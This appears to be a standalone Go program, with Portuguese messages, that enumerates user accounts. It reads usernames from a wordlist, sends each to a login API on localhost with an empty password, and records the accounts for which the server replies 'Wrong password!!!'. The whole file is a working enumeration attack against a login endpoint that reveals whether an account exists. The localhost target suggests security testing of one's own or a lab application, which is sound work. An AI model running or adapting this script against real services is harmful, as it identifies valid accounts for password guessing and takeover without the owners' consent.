package main

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
)

type Usuario struct {
	Login    string `json:"login"`
	Password string `json:"password"`
}

func main() {
	
	file, err := os.Open("wordlists/users.txt")
	if err != nil {
		panic(err)
	}
	defer file.Close()

	var usuarios []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		usuarios = append(usuarios, scanner.Text())
	}

	url := "http://localhost:5127/api/authentication/login"
	var usuariosValidos []string
	for _, usuario := range usuarios {
		
		payload := Usuario{
			Login:    usuario,
			Password: "",
		}
		jsonPayload, err := json.Marshal(payload)
		if err != nil {
			panic(err)
		}

		
		resp, err := http.Post(url, "application/json", bytes.NewBuffer(jsonPayload))
		if err != nil {
			panic(err)
		}
		defer resp.Body.Close()

		
		if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusUnauthorized {
			var jsonResponse map[string]interface{}
			json.NewDecoder(resp.Body).Decode(&jsonResponse)
			if jsonResponse["message"] == "Wrong password!!!" {
				fmt.Printf("Usuário válido: %s\n", usuario)
				usuariosValidos = append(usuariosValidos, usuario)
			} else {
				fmt.Printf("Usuário inválido: %s\n", usuario)
			}
		} else {
			fmt.Printf("Erro ao validar usuário %s, status code: %d\n", usuario, resp.StatusCode)
		}
	}

	
	err = saveUsersToFile("usersValidos.txt", usuariosValidos)
	if err != nil {
		fmt.Println("Erro ao salvar usuários válidos:", err)
	} else {
		fmt.Println("Usuários válidos salvos com sucesso.")
	}
}

func saveUsersToFile(filename string, users []string) error {
	file, err := os.Create(filename)
	if err != nil {
		return err
	}
	defer file.Close()

	writer := bufio.NewWriter(file)
	for _, user := range users {
		_, err := writer.WriteString(user + "\n")
		if err != nil {
			return err
		}
	}

	err = writer.Flush()
	if err != nil {
		return err
	}

	return nil
}
